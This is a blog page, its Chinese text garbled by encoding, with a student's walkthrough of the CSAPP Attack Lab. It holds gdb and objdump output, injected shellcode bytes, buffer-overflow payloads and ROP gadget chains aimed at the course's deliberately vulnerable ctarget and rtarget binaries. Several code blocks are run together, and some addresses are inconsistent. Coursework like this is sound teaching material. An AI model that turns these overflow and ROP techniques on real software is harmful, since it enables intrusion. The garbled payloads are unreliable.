<!DOCTYPE html>
<html lang="en-us">

<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
	
	<title>3wã®blog  | CSAPP_AttackLab</title>
	<meta name="viewport" content="width=device-width,minimum-scale=1">
	<meta name="generator" content="Hugo 0.85.0" />
	
	
	<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
	

	
	
	<link href="/dist/app.css" rel="stylesheet">
	

	

	
	
	

	
	
	
	
	
	<script>
		(function (u, c) {
			var d = document,
				t = 'script',
				o = d.createElement(t),
				s = d.getElementsByTagName(t)[0];
			o.src = u;
			if (c) {
				o.addEventListener('load', function (e) {
					c(e);
				});
			}
			s.parentNode.insertBefore(o, s);
		})('https:\/\/weivwang.github.io\/lib\/pangu.min.js', function () {
			pangu.spacingPage();
		});
	</script>
	
	
	
	<style type="text/css" media="screen, print">
		@font-face {
			font-family: "FancyTitleFont";
			font-style: normal;
			font-display: swap;
			src: url('%25!s%28%3cnil%3e%29.woff2') format('woff2'),
				url('%25!s%28%3cnil%3e%29.woff') format('woff');
		}
		 
		  
		 
		@font-face {
			font-family: 'Noto Serif CJK SC';
			font-style: normal;
			font-weight: 300;
			font-display: swap;
			src: local('Noto Serif CJK SC Light'), local('NotoSerifCJK-Light'),
				url('https://weivwang.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-300.woff2') format('woff2'),
				 
				url('https://weivwang.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-300.woff') format('woff');
			 
		}

		 
		@font-face {
			font-family: 'Noto Serif CJK SC';
			font-style: normal;
			font-weight: 400;
			font-display: swap;
			src: local('Noto Serif CJK SC'), local('NotoSerifCJK-Regular'),
				url('https://weivwang.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-regular.woff2') format('woff2'),
				 
				url('https://weivwang.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-regular.woff') format('woff');
			 
		}

		 
		@font-face {
			font-family: 'Noto Serif CJK SC';
			font-style: normal;
			font-weight: 500;
			font-display: swap;
			src: local('Noto Serif CJK SC Medium'), local('NotoSerifCJK-Medium'),
				url('https://weivwang.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-500.woff2') format('woff2'),
				 
				url('https://weivwang.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-500.woff') format('woff');
			 
		}
	</style>
	
</head>

<body class="bg-gray-100 text-gray-700 font-sans">
	<div class="p-6 sm:p-10 md:p-16 flex flex-wrap">
		<header class="w-full md:w-2/5 xl:w-1/2 md:pr-12 lg:pr-20 xl:pr-24 order-1 md:order-1 max-w-2xl">
			<div
				class="z-50 bg-gray-100 bg-opacity-75 bg-opacity-custom lg:min-w-0.7 max-w-xl md:float-right md:text-right leading-loose tracking-tight md:sticky md:top-0 pt-2">
				
<div>
	<h2>
		<a href="https://weivwang.github.io" title="3wã®blog" class="heading font-cursive icon">3wã®blog</a>
	</h2>
</div>
<h1 class="pt-2">CSAPP_AttackLab</h1>

<div class="flex flex-wrap justify-end pt-2 "><div class="md:flex-grow-0 font-light">
	

	

	
</div><time class="text-eucalyptus-500 md:text-right md:flex-grow font-light pl-4"
		datetime="2021-11-15T14:39:54&#43;08:00">2021-11-15 14:39</time>
</div>

<hr />


			</div>
		</header>
		<main role="main" class="w-full md:w-3/5 xl:w-1/2 max-w-3xl order-2 md:order-2 min-h-70vh pt-2 pb-4">
			

<article>
	<section class="mx-auto content">
		<div class="c-rich-text"><p>CSAPP_Attack</p>
<p>è¦æ±‚è¿›è¡Œäº”æ¬¡æ”»å‡»ã€‚æ”»å‡»æ–¹å¼æ˜¯code injectionä»£ç æ³¨å…¥å’ŒReeturn-oriented programming(ROP)</p>
<p>å‚è€ƒèµ„æ–™ï¼š<!-- raw HTML omitted -->å†™çš„æ¯”è¾ƒå¥½çš„ä¸€ä¸ªæ•™ç¨‹<!-- raw HTML omitted --></p>
<h3 id="å‰ç½®çŸ¥è¯†">å‰ç½®çŸ¥è¯†</h3>
<p><strong>Code Injection</strong>ï¼š</p>
<p>é€šè¿‡ä½¿ç¼“å†²åŒºæº¢å‡ºï¼Œæ³¨å…¥æ”»å‡»ä»£ç ã€‚è¿™ç§æƒ…å†µæ˜¯æ²¡æœ‰å¼€å¯æ ˆéšæœºåŒ–ï¼ˆæ¯ä¸€æ¬¡æ‰§è¡Œï¼Œåæ±‡ç¼–æŸä¸ªå‡½æ•°ï¼Œä¼šå‘ç°æ±‡ç¼–ä»£ç çš„åœ°å€æ˜¯å›ºå®šçš„ï¼‰ï¼ŒåŒæ—¶æ²¡æœ‰å¼€é‡‘ä¸é›€é˜²æ­¢æ ˆæº¢å‡ºï¼Œåæ±‡ç¼–ä¹Ÿå¯ä»¥çœ‹åˆ°ï¼Œæ²¡æœ‰%fs:40 ä¹‹ç±»çš„æŒ‡ä»¤ï¼Œè€Œåœ¨bomblabé‡Œé¢è¯»æ±‡ç¼–ä»£ç ä¼šå‘ç°æ¯ä¸€ä¸ªå‡½æ•°éƒ½æœ‰é‡‘ä¸é›€ï¼ˆä¹Ÿè§£å†³äº†å½“æ—¶åšé‚£ä¸€ä¸ªå®éªŒçš„ç–‘æƒ‘ï¼‰ï¼Œå¦‚ä¸‹ï¼š</p>
<pre><code>    141f:       64 48 8b 04 25 28 00    mov    %fs:0x28,%rax
    1426:       00 00
    1428:       48 89 44 24 08          mov    %rax,0x8(%rsp)
    142d:       31 c0                   xor    %eax,%eax
</code></pre><p>è¿™é‡Œçš„fsæ˜¯æ®µåŸºå€ï¼Œcsappæ•™æä¸Šæœ‰è®²ï¼Œä½†æ˜¯æ²¡ç»†è¯´ã€‚çœ‹ç‹çˆ½çš„ã€Šæ±‡ç¼–è¯­è¨€ã€‹è®²äº†è¿™ä¸ªæ¦‚å¿µï¼Œä¸€èˆ¬åœ¨8086æœºä¸Šä¼šä½¿ç”¨æ®µåç§»è¿™ç§å¯»å€æ–¹å¼ï¼Œå¤§è‡´æ˜¯ï¼šåœ°å€çº¿æœ‰20ä½ï¼Œä½†æ˜¯å¯„å­˜å™¨åªæœ‰16ä½ï¼Œæ‰€ä»¥é‡‡ç”¨16bitæ®µåœ°å€+4bitåç§»é‡æ¥è¿›è¡Œå¯»å€ï¼šç‰©ç†åœ°å€ = æ®µåœ°å€*16 + åç§»åœ°å€ã€‚</p>
<p>å¦ä¸€ä¸ªå¼„æ‡‚çš„åœ°æ–¹æ˜¯ï¼šå®é™…ä¸Šå†…å­˜å¤§å°æ˜¯å±€é™äºåœ°å€æ€»çº¿çš„å®½åº¦çš„ã€‚å› ä¸ºåœ°å€æ€»çº¿çš„å®½åº¦ä»£è¡¨äº†å¯»å€çš„èƒ½åŠ›ï¼Œè€Œå†…å­˜å¤§å°è¶…è¿‡è¿™ä¸ªå¯»å€èŒƒå›´ï¼Œå¤šå‡ºå»çš„å†…å­˜æ²¡ç”¨äº†ï¼Œå› ä¸ºæ‰¾ä¸åˆ°ã€‚</p>
<p>ä½†æ˜¯ç°åœ¨çš„x86-64çš„å¯»å€èƒ½åŠ›ç†è®ºä¸Šèƒ½è¾¾åˆ°1800ä¸‡TBï¼Œè€Œå®é™…ä¸Šç›®å‰åšä¸å‡ºæ¥è¿™ä¹ˆå¤§çš„å†…å­˜ï¼Œæ‰€ä»¥ç°åœ¨å¯ä»¥è®¤ä¸ºå†…å­˜å¯ä»¥å¾€é«˜äº†åŠ ã€‚</p>
<p>æ‰¯å¼€äº†ï¼Œæ¥ç€çœ‹ä¸Šé¢çš„æŒ‡ä»¤ï¼Œå…ˆå°†æ®µåç§»èµ‹ç»™raxï¼Œæ¥ç€é€šè¿‡raxå®šä½rspï¼Œè¿™å…¶å®å·²ç»å›ºå®šå¥½äº†ç¼“å†²åŒºçš„å¤§å°ï¼Œæœ€åä¸€ä¸ªxorå¼‚æˆ–æŒ‡ä»¤æ„ä¹‰åœ¨äºï¼šä¸€æ—¦ç”¨æˆ·è¾“å…¥æ•°æ®æº¢å‡ºç¼“å†²åŒºï¼Œè¦†ç›–äº†é‡‘ä¸é›€æ•°ï¼Œå‰åé‡‘ä¸é›€æ•°å¼‚æˆ–ç»“æœä¸€å®šä¸º1ï¼Œè®¾ç½®æŸä¸ªæ ‡å¿—ä½ä¸º1ä¹‹åç¨‹åºé€€å‡ºï¼Œè¿™æ ·å°±é˜²æ­¢äº†ç¼“å†²åŒºæº¢å‡ºçš„é—®é¢˜ã€‚</p>
<p><strong>ROP</strong>ï¼š</p>
<p>return-oriented programming
ROPå³ä½¿ç”¨ä½ ç¨‹åºé‡Œçš„å­—èŠ‚ä»£ç æ”»å‡»ä½ çš„ç¨‹åºã€‚</p>
<p>å°±æ˜¯åœ¨å¼€å¯æ ˆç©ºé—´éšæœºåŒ–ä¹‹åï¼Œæ¯æ¬¡åˆå§‹åŒ–æ ˆï¼Œæ ˆé‡Œé¢æ”¾çš„æ˜¯allocateå‡½æ•°ï¼Œåˆ†é…éšæœºå¤§å°ç©ºé—´ï¼Œå®é™…çš„è°ƒç”¨æ ˆå¸§åœ¨è¿™ä¸ªéšæœºç©ºé—´ä¹‹åï¼Œè¿™æ ·å°±å®ç°äº†æ ˆç©ºé—´çš„éšæœºåŒ–ï¼Œé‚£é»‘å®¢æ‹¿ä¸åˆ°è¿™ä¸ªæ ˆåœ°å€ï¼Œè‡ªç„¶æ— æ³•ç›´æ¥injectç¨‹åºã€‚</p>
<p>ä½†æ˜¯ä¹Ÿæœ‰æ–¹æ³•ï¼šæœ‰äº›é»‘å®¢ç”¨nopæŒ‡ä»¤ï¼Œnopå°†rip+4æˆ–+8ï¼Œ ä¸æ‰§è¡Œæ“ä½œï¼Œè¿™æ ·æ€»æœ‰ä¸€æ¬¡èƒ½æ‰¾åˆ°ç›®æ ‡ç¨‹åºã€‚ä½†æ˜¯ç°åœ¨éšæœºçš„ç©ºé—´èŒƒå›´å¤ªå¤§äº†ï¼Œä¹Ÿä¸ç”¨è¿™ç§æ–¹æ³•äº†ã€‚</p>
<p>å¦ä¸€ç§ï¼šç”¨ç¨‹åºé‡Œé¢çš„ä»£ç æ”»å‡»ç¨‹åºï¼Œè¿™æ ·å°±ä¸ç”¨æ³¨å…¥ä»£ç äº†ï¼Œæˆ‘ç”¨ä½ ç¨‹åºæœ¬æ¥çš„ä»£ç æ¥å½“ä½œæˆ‘çš„æŒ‡ä»¤ï¼Œå®ç°æ”»å‡»ã€‚</p>
<p><strong>Objdump</strong></p>
<p><strong>GCC</strong></p>
<p><strong>GDB</strong></p>
<p>è¿™å‡ ä¸ªä¹Ÿéƒ½æ˜¯bomblabè¦ç”¨çš„</p>
<h3 id="å®éªŒææ–™">å®éªŒææ–™</h3>
<p><img src="https://i.loli.net/2021/11/17/KhJyFQzwINZgpe3.png" alt="image-20211117171611619"></p>
<ul>
<li>
<p>cookieï¼šå­˜æ”¾é€šè¿‡å…³å¡éœ€è¦çš„å­—ç¬¦ä¸²</p>
</li>
<li>
<p>Ctargetï¼šä½¿ç”¨code injectionæ–¹å¼è¿›è¡Œæ”»å‡»çš„ç¨‹åº</p>
</li>
<li>
<p>Farm.cï¼šæ„Ÿè§‰æ²¡ä»€ä¹ˆç”¨ï¼Œå·²ç»è¢«ç¼–è¯‘è¿›rtargeté‡Œé¢äº†</p>
</li>
<li>
<p>Hex2raw ï¼š16è¿›åˆ¶è½¬å­—ç¬¦ä¸²</p>
</li>
<li>
<p>Readmeï¼šå­¦å·ç­‰ä¿¡æ¯</p>
</li>
<li>
<p>rtargetï¼šä½¿ç”¨ROPæ–¹å¼è¿›è¡Œæ”»å‡»</p>
</li>
</ul>
<p><img src="https://i.loli.net/2021/11/17/dt9kUxI4rBf5TqM.png" alt="image-20211117173053423"></p>
<p><img src="https://i.loli.net/2021/11/17/fs2FWva8PDBYwjg.png" alt="image-20211117173106212"></p>
<p>Gets()æ˜¯ä¸å®‰å…¨çš„ï¼Œæ²¡æœ‰é™åˆ¶è¯»å…¥çš„é•¿åº¦ï¼Œå®¹æ˜“å¯¼è‡´ç¼“å†²åŒºæº¢å‡º</p>
<p><img src="https://i.loli.net/2021/11/17/wbhmruZO4e6F5Nf.png" alt="image-20211117173229239"></p>
<h3 id="touch1">touch1</h3>
<pre><code>gdb ctarget
</code></pre><pre><code>disas getbuf
#è¾“å‡ºï¼š
Dump of assembler code for function getbuf:
   0x0000000000401796 &lt;+0&gt;:	sub    $0x38,%rsp
   0x000000000040179a &lt;+4&gt;:	mov    %rsp,%rdi
   0x000000000040179d &lt;+7&gt;:	callq  0x401a36 &lt;Gets&gt;
   0x00000000004017a2 &lt;+12&gt;:	mov    $0x1,%eax
   0x00000000004017a7 &lt;+17&gt;:	add    $0x38,%rsp
   0x00000000004017ab &lt;+21&gt;:	retq   
</code></pre><pre><code>disas touch1
#è¾“å‡ºï¼š
	 0x00000000004017ac &lt;+0&gt;:	sub    $0x8,%rsp
   0x00000000004017b0 &lt;+4&gt;:	movl   $0x1,0x202d42(%rip)        # 0x6044fc &lt;vlevel&gt;
   0x00000000004017ba &lt;+14&gt;:	lea    0x1968(%rip),%rdi        # 0x403129
   0x00000000004017c1 &lt;+21&gt;:	callq  0x400c70 &lt;puts@plt&gt;
   0x00000000004017c6 &lt;+26&gt;:	mov    $0x1,%edi
   0x00000000004017cb &lt;+31&gt;:	callq  0x401ca6 &lt;validate&gt;
   0x00000000004017d0 &lt;+36&gt;:	mov    $0x0,%edi
   0x00000000004017d5 &lt;+41&gt;:	callq  0x400de0 &lt;exit@plt&gt;
</code></pre><p>getbufæ˜¯ä¸å®‰å…¨çš„ï¼Œå®ƒå»ºç«‹0x38å¤§å°çš„ç¼“å†²åŒºï¼Œå¸Œæœ›è¯»å…¥0x38çš„æ•°æ®ï¼Œä½†æ˜¯æˆ‘ä»¬ä¸€æ—¦è¾“å…¥çš„æ•°æ®è¶…è¿‡0x38ï¼Œä¼šå°†getbufçš„è¿”å›åœ°å€è¦†ç›–ã€‚</p>
<p>æ‰€ä»¥æ€è·¯æ˜¯ï¼Œå†™æ»¡ç¼“å†²åŒºï¼Œå¹¶å°†æº¢å‡ºéƒ¨åˆ†ï¼ˆåŸæœ¬çš„è¿”å›åœ°å€ï¼‰è®¾ç½®ä¸ºtouch1çš„åœ°å€ï¼Œè¿™æ ·getbufå°†ç›´æ¥è¿”å›åˆ°touch1</p>
<p>touch1åœ°å€ä¸º0x00000000004017ac</p>
<p>æ‰€ä»¥åªéœ€è¦å°†getbuf()å‡½æ•°è¿”å›åœ°å€ä¿®æ”¹ä¸º0x00000000004017acï¼Œåˆ©ç”¨ç¼“å†²åŒºæº¢å‡ºçš„åŸç†</p>
<p>æ–°å»ºè¾“å…¥æ–‡ä»¶level1.txtï¼š</p>
<pre><code>vim level1.txt
</code></pre><p>å¡«å……å†…å®¹ï¼š</p>
<pre><code>00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 #å¡«æ»¡ç¼“å†²åŒº
ac 17 40 00 00 00 00 00 #è¿”å›åœ°å€æ”¹ä¸ºtouch1
</code></pre><p>æ³¨æ„ï¼Œå¤§éƒ¨åˆ†æœºå™¨é‡‡ç”¨å°ç«¯æ³•ï¼Œæ•°æ˜¯åè¿‡æ¥çš„</p>
<pre><code>./hex2raw -i level1.txt | ./ctarget -q
</code></pre><p>é¡ºåˆ©é€šè¿‡</p>
<pre><code>Cookie: 0x5fc1af14
Type string:Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
	user id	2019302110426
	course	15213-f15
	lab	attacklab
	result	251:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 AC 17 40 00 00 00 00 00 

</code></pre><h3 id="touch2">touch2</h3>
<pre><code>disas touch2
</code></pre><pre><code>	 0x00000000004017da &lt;+0&gt;:	sub    $0x8,%rsp
   0x00000000004017de &lt;+4&gt;:	mov    %edi,%edx
   0x00000000004017e0 &lt;+6&gt;:	movl   $0x2,0x202d12(%rip)        # 0x6044fc &lt;vlevel&gt;
   0x00000000004017ea &lt;+16&gt;:	cmp    %edi,0x202d14(%rip)        # 0x604504 &lt;cookie&gt;
   0x00000000004017f0 &lt;+22&gt;:	je     0x40181c &lt;touch2+66&gt;
   0x00000000004017f2 &lt;+24&gt;:	lea    0x197f(%rip),%rsi        # 0x403178
   0x00000000004017f9 &lt;+31&gt;:	mov    $0x1,%edi
   0x00000000004017fe &lt;+36&gt;:	mov    $0x0,%eax
   0x0000000000401803 &lt;+41&gt;:	callq  0x400d90 &lt;__printf_chk@plt&gt;
   0x0000000000401808 &lt;+46&gt;:	mov    $0x2,%edi
   0x000000000040180d &lt;+51&gt;:	callq  0x401d76 &lt;fail&gt;
   0x0000000000401812 &lt;+56&gt;:	mov    $0x0,%edi
   0x0000000000401817 &lt;+61&gt;:	callq  0x400de0 &lt;exit@plt&gt;
   0x000000000040181c &lt;+66&gt;:	lea    0x192d(%rip),%rsi        # 0x403150
   0x0000000000401823 &lt;+73&gt;:	mov    $0x1,%edi
   0x0000000000401828 &lt;+78&gt;:	mov    $0x0,%eax
   0x000000000040182d &lt;+83&gt;:	callq  0x400d90 &lt;__printf_chk@plt&gt;
   0x0000000000401832 &lt;+88&gt;:	mov    $0x2,%edi
   0x0000000000401837 &lt;+93&gt;:	callq  0x401ca6 &lt;validate&gt;
   0x000000000040183c &lt;+98&gt;:	jmp    0x401812 &lt;touch2+56&gt;
</code></pre><p>ç›¸æ¯”äºtouch1ï¼Œtouch2å¸¦å‚æ•°ï¼Œåœ¨touch2å†…éƒ¨å°†å‚æ•°ä¸cookieå€¼è¿›è¡Œæ¯”è¾ƒï¼Œè‹¥ç›¸ç­‰æ‰èƒ½è¿‡å…³</p>
<p>åœ°å€ä¸ºï¼š0x00000000004017da</p>
<p>ä¸èƒ½ä½¿ç”¨jmpæˆ–è€…callæŒ‡ä»¤ï¼Œæ‰€ä»¥å°†touch2åœ°å€å‹å…¥æ ˆï¼Œä½¿ç”¨retæŒ‡ä»¤å°†touch2åœ°å€å¼¹å‡ºï¼Œå¹¶è®¾ç½®ä¸ºæŒ‡ä»¤å¯„å­˜å™¨çš„å€¼ï¼Œå› ä¸ºtouch2å°†è¾“å…¥çš„å‚æ•°ä¸cookieæ¯”è¾ƒï¼Œæ‰€ä»¥æŠŠcookieå€¼èµ‹ç»™ç¬¬ä¸€ä¸ªå‚æ•°rdi</p>
<p>æ³¨å…¥ä»£ç ï¼š</p>
<pre><code>vim inject.s
</code></pre><pre><code>movq $0x5fc1af14, %rdi #å°†cookieèµ‹ç»™rdiå¯„å­˜å™¨ï¼Œrdiå­˜æ”¾å‡½æ•°ç¬¬ä¸€ä¸ªå‚æ•°pushq $0x00000000004017da #å‹å…¥touch2åœ°å€ret #å¼¹å‡ºtouch2åœ°å€ï¼Œèµ‹ç»™rsiï¼Œè¿™ä¸¤æ­¥æ˜¯ä¸ºäº†è·³è½¬åˆ°touch2
</code></pre><p>ç”Ÿæˆä¸º.oæ–‡ä»¶ï¼š</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gcc -c inject.s
</code></pre></div><p>æŸ¥çœ‹.oæ–‡ä»¶ï¼Œä»è€Œè·å¾—å¯æ‰§è¡Œçš„æŒ‡ä»¤åºåˆ—</p>
<pre><code>objdump -d inject.o
</code></pre><p>è¾“å‡ºï¼š</p>
<pre><code>Disassembly of section .text:

0000000000000000 &lt;.text&gt;:
   0:	48 c7 c7 14 af c1 5f 	mov    $0x5fc1af14,%rdi
   7:	68 da 17 40 00  	pushq  $0x4017da
   e:	c3 
</code></pre><p>æ‰€ä»¥è¿™ä¸‰æ¡æŒ‡ä»¤åºåˆ—ï¼š</p>
<pre><code>48 c7 c7 14 af c1 5f ff 34 25 da 17 40 00 c3 
</code></pre><p>å¯»æ‰¾getbufçš„rspåœ°å€ï¼Œå®ç°è¦†ç›–</p>
<pre><code>gdb ctargetbreak getbufrun -qdisas
</code></pre><p>disasè¾“å‡ºï¼š</p>
<pre><code>(gdb) disas
Dump of assembler code for function getbuf:
=&gt; 0x0000000000401796 &lt;+0&gt;:	sub    $0x38,%rsp
   0x000000000040179a &lt;+4&gt;:	mov    %rsp,%rdi
   0x000000000040179d &lt;+7&gt;:	callq  0x401a36 &lt;Gets&gt;
   0x00000000004017a2 &lt;+12&gt;:	mov    $0x1,%eax
   0x00000000004017a7 &lt;+17&gt;:	add    $0x38,%rsp
   0x00000000004017ab &lt;+21&gt;:	retq   
</code></pre><pre><code>stepi
</code></pre><p>æŸ¥çœ‹rspå€¼</p>
<pre><code>p/x $rsp
</code></pre><pre><code>$1 = 0x55660a78 
</code></pre><p>touch2åœ°å€ï¼š0x55660a78</p>
<p>getbufå’Œç¬¬ä¸€å…³å¤§å°ä¸€æ ·ï¼Œéƒ½æ˜¯0x38</p>
<pre><code>vim level2.txt
</code></pre><pre><code>48 c7 c7 14 af c1 5f 68 
da 17 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 0a 66 55 00 00 00 00
</code></pre><pre><code>./hex2raw -i level2.txt | ./ctarget -q
</code></pre><p>./hex2raw -i level5.txt | ./rtarget -q</p>
<p>0x55660ab0</p>
<p>0x55660a78</p>
<h3 id="touch3">touch3</h3>
<p><img src="https://i.loli.net/2021/11/17/Hdx8wkiRSQFCEZp.png" alt="image-20211117174559398"></p>
<p>![image-20211117174622704](/Users/wangweiwei/Library/Application Support/typora-user-images/image-20211117174622704.png)</p>
<pre><code>disas touch3
</code></pre><pre><code>   0x00000000004018f1 &lt;+0&gt;:	push   %rbx   0x00000000004018f2 &lt;+1&gt;:	mov    %rdi,%rbx   0x00000000004018f5 &lt;+4&gt;:	movl   $0x3,0x202bfd(%rip)        # 0x6044fc &lt;vlevel&gt;   0x00000000004018ff &lt;+14&gt;:	mov    %rdi,%rsi   0x0000000000401902 &lt;+17&gt;:	mov    0x202bfc(%rip),%edi        # 0x604504 &lt;cookie&gt;   0x0000000000401908 &lt;+23&gt;:	callq  0x40183e &lt;hexmatch&gt;   0x000000000040190d &lt;+28&gt;:	test   %eax,%eax   0x000000000040190f &lt;+30&gt;:	je     0x40193e &lt;touch3+77&gt;   0x0000000000401911 &lt;+32&gt;:	mov    %rbx,%rdx   0x0000000000401914 &lt;+35&gt;:	lea    0x1885(%rip),%rsi        # 0x4031a0   0x000000000040191b &lt;+42&gt;:	mov    $0x1,%edi   0x0000000000401920 &lt;+47&gt;:	mov    $0x0,%eax   0x0000000000401925 &lt;+52&gt;:	callq  0x400d90 &lt;__printf_chk@plt&gt;   0x000000000040192a &lt;+57&gt;:	mov    $0x3,%edi   0x000000000040192f &lt;+62&gt;:	callq  0x401ca6 &lt;validate&gt;   0x0000000000401934 &lt;+67&gt;:	mov    $0x0,%edi   0x0000000000401939 &lt;+72&gt;:	callq  0x400de0 &lt;exit@plt&gt;   0x000000000040193e &lt;+77&gt;:	mov    %rbx,%rdx   0x0000000000401941 &lt;+80&gt;:	lea    0x1880(%rip),%rsi        # 0x4031c8   0x0000000000401948 &lt;+87&gt;:	mov    $0x1,%edi
</code></pre><pre><code> 0x00000000004018f1 &lt;+0&gt;:	push   %rbx
   0x00000000004018f2 &lt;+1&gt;:	mov    %rdi,%rbx
   0x00000000004018f5 &lt;+4&gt;:	movl   $0x3,0x202bfd(%rip)        # 0x6044fc &lt;vlevel&gt;
   0x00000000004018ff &lt;+14&gt;:	mov    %rdi,%rsi
   0x0000000000401902 &lt;+17&gt;:	mov    0x202bfc(%rip),%edi        # 0x604504 &lt;cookie&gt;
   0x0000000000401908 &lt;+23&gt;:	callq  0x40183e &lt;hexmatch&gt;
   0x000000000040190d &lt;+28&gt;:	test   %eax,%eax
   0x000000000040190f &lt;+30&gt;:	je     0x40193e &lt;touch3+77&gt;
   0x0000000000401911 &lt;+32&gt;:	mov    %rbx,%rdx
   0x0000000000401914 &lt;+35&gt;:	lea    0x1885(%rip),%rsi        # 0x4031a0
   0x000000000040191b &lt;+42&gt;:	mov    $0x1,%edi
   0x0000000000401920 &lt;+47&gt;:	mov    $0x0,%eax
   0x0000000000401925 &lt;+52&gt;:	callq  0x400d90 &lt;__printf_chk@plt&gt;
   0x000000000040192a &lt;+57&gt;:	mov    $0x3,%edi
   0x000000000040192f &lt;+62&gt;:	callq  0x401ca6 &lt;validate&gt;
   0x0000000000401934 &lt;+67&gt;:	mov    $0x0,%edi
   0x0000000000401939 &lt;+72&gt;:	callq  0x400de0 &lt;exit@plt&gt;
   0x000000000040193e &lt;+77&gt;:	mov    %rbx,%rdx
   0x0000000000401941 &lt;+80&gt;:	lea    0x1880(%rip),%rsi        # 0x4031c8
   0x0000000000401948 &lt;+87&gt;:	mov    $0x1,%edi
</code></pre><pre><code class="language-undefined" data-lang="undefined">./hex2raw -i level3.txt | ./ctarget -q
</code></pre><pre><code>48 c7 c7 b8 0a 66 55 68 
f1 18 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 0a 66 55 00 00 00 00
35 66 63 31 61 66 31 34
00
</code></pre><p>Mov cookieåœ°å€ rdi</p>
<p>pop touch3</p>
<p>ret</p>
<p>å…³äºcookieå­—ç¬¦æ•°ç»„å­˜æ”¾çš„ä½ç½®ï¼š</p>
<p><img src="https://i.loli.net/2021/11/17/rZH1G8gwYXABLCk.png" alt="image-20211117174844978"></p>
<p>cookieéœ€è¦ä»¥0ç»“å°¾ï¼š</p>
<p><img src="https://i.loli.net/2021/11/17/buo9BYfIeRyDExd.png" alt="image-20211117174941581"></p>
<h3 id="rop-touch2">ROP touch2</h3>
<ol>
<li>å¼€å¯äº†æ ˆéšæœºåŒ–,æ ˆçš„ä½ç½®åœ¨ç¨‹åºæ¯æ¬¡è¿è¡Œæ—¶éƒ½æœ‰å˜åŒ–ï¼Œéš¾ä»¥é¢„æµ‹æ”»å‡»å­—ç¬¦ä¸²çš„ä½ç½®ï¼ˆç©ºæ“ä½œé›ªæ©‡<code>nop sled</code>å¯æš´åŠ›æšä¸¾,å¤ªåºå¤§ï¼‰</li>
<li>æ ˆç©ºé—´ä¸å…è®¸æœ‰å¯æ‰§è¡ŒæŒ‡ä»¤ï¼Œé™åˆ¶äº†å¯æ‰§è¡Œä»£ç åŒºåŸŸ</li>
</ol>
<pre><code>Mov4019c5:	c7 07 48 89 c7 c3    	movl   $0xc3c78948,(%rdi)4019c5 + 2 = 4019c7Pop401994:	8d 87 58 90 90 c3    	lea    -0x3c6f6fa8(%rdi),%eax401994 + 2 = 401996
</code></pre><p>00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
96 02 00 00 00 00 00 00 # pop rax , å°†è¿”å›åœ°å€å˜ä¸ºgetgad1
14 af c1 5f 00 00 00 00 # cookieå€¼ï¼Œå…¶å®æ˜¯æ‰§è¡Œ set rax = cookie
37 00 00 00 00 00 00 00 # mov rax rdi
da 17 40 00 00 00 00 00</p>
<h3 id="rop-touch3">ROP touch3</h3>
<p>mov    %rsp,%rax</p>
<p>401a00:	8d 87 48 89 e0 94    	lea    -0x6b1f76b8(%rdi),%eax</p>
<p>401a00 + 2 = 401a02</p>
<p>add    $0x20,%rax</p>
<p>4019d2:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax</p>
<p>4019d2 + 2 = 4019d4</p>
<p>48 89 c7 :</p>
<p>4019a2:	8d 87 48 89 c7 92    	lea    -0x6d3876b8(%rdi),%eax</p>
<p>4019a2 + 2 = 4019a4</p>
<p>0x00000000004018f1</p>
<pre><code>0:	48 89 e0             	  mov    %rsp,%rax   3:	04 37               	add    $0x37,%rax   5:	48 89 c7             	mov    %rax,%rdi
</code></pre><pre><code>00 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0084 1a 40 00 00 00 00 00 #gadget1d4 19 40 00 00 00 00 00 #gadvget29e 19 40 00 00 00 00 00 #gadget3f1 18 40 00 00 00 00 00 #touch300 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 0035 66 63 31 61 66 31 3400
</code></pre><p>movq %rsp,%rax  : 48 89 e0</p>
<p>add $0x20,%al #$å¸¸æ•°ä¸ºåç§»é‡ï¼Œæš‚æ—¶æœªå®š : 04 xx</p>
<p>movq %rax,%rdi</p>
<p><img src="https://i.loli.net/2021/11/15/1pcX5D9JeAtTLUy.png" alt="image-20211115110336875"></p>
<p>401a84 æ˜¯gedget1ï¼Œè®©rsp = rax</p>
<p><img src="https://i.loli.net/2021/11/15/v19IO5bNXEJnTDW.png" alt="image-20211115110905570"></p>
<p>40 19 d4</p>
<p><img src="https://i.loli.net/2021/11/15/YKIa62Pd5gSWfrN.png" alt="image-20211115111041884"></p>
<p>40 19 9e</p>
<pre><code>./hex2raw -i level5.txt | ./rtarget -q
